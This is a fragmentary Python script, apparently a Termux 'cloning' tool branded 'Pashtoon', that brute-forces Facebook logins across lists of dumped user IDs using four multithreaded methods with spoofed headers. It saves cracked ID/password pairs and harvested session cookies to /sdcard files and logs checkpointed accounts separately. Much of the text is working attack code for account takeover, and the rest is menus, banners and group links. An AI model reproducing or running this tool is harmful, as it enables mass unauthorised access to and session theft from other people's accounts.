...
from concurrent.futures import ThreadPoolExecutor as sarfrazPashtoon
...
sys.stdout.write('\x1b]2; Pashtoon\x07')
...
\033[1;37m Owner   :            Pashtoon

\033[1;37m Facebook:            Pashtoon

\033[1;37m Github  :            Pashtoon
...
def result(OKs,cps):
    ...
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back Pashtoon Menu ")
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/GxDdo9eTAFy6t7yJNTs7ec')

        pass

    elif select =='F':

        os.system('xdg-open https://facebook.com/groups/169635812677248/')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {S}[Pashtoon] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Pashtoonb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Pashtoonb};{ckkk}"

                    print(f"\r{R} [Pashtoon-OK] {sid} | {ps} {S}")

                    oks.append(sid)

                    open('/sdcard/Pashtoon_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Pashtoon_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')

                    break

                elif 'www.facebook.com' in q['error']['message']:

                     #print(f"\r{A} [Pashtoon-CP] {sid} | {ps} {S}")

                     cps.append(sid)

                     open('/sdcard/Pashtoon_CP.txt','a').write(sid+'|'+ps+'\n')
    ...
    def methodC(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {S}[Pashtoon] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/Pashtoon_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Pashtoon_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
    ...
    def methodB(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {S}[Pashtoon] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        ...
        sys.stdout.write(f"\r {S}[Pashtoon] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/Pashtoon_OK.txt','a').write(sid+'|'+ps+'\n')
    ...
    def pasw(self):       
            ...
            with sarfrazPashtoon(max_workers=30) as Pashtoonworld:
                       ...
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           ...
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ...
                                Pashtoonworld.submit(self.methodA, uid, name, pwx)

                            elif 'methodB' in methods:

                                Pashtoonworld.submit(self.methodB, uid, name, pwx)

                            elif 'methodC' in methods:

                                Pashtoonworld.submit(self.methodC, uid, name, pwx)

                            elif 'methodD' in methods:

                                Pashtoonworld.submit(self.methodD, uid, name, pwx)
...
def public():
    ...
    try:
        ...
        print(f'File Name To Dump Ids. Example /sdcard/Pashtoon.txt') 
...
def sids():
    ...
    print('\033[1;37mExample: /sdcard/Pashtoon.txt\033[0;97m')
...
def cutter():
    ...
    os.system('sort -r '+Pashtoon+' | uniq > '+sarfraz)

    os.system('clear')

    print(logo)

    print("Removed Successful From File : " + Pashtoon )
    ...
    input(f"{S} Press Enter To Back Pashtoon Menu ")
...
def p_dump():
    ...
    try:
        ...
        print(f'{S}File Name To Dump Ids. Example /sdcard/Pashtoon.txt\n') 
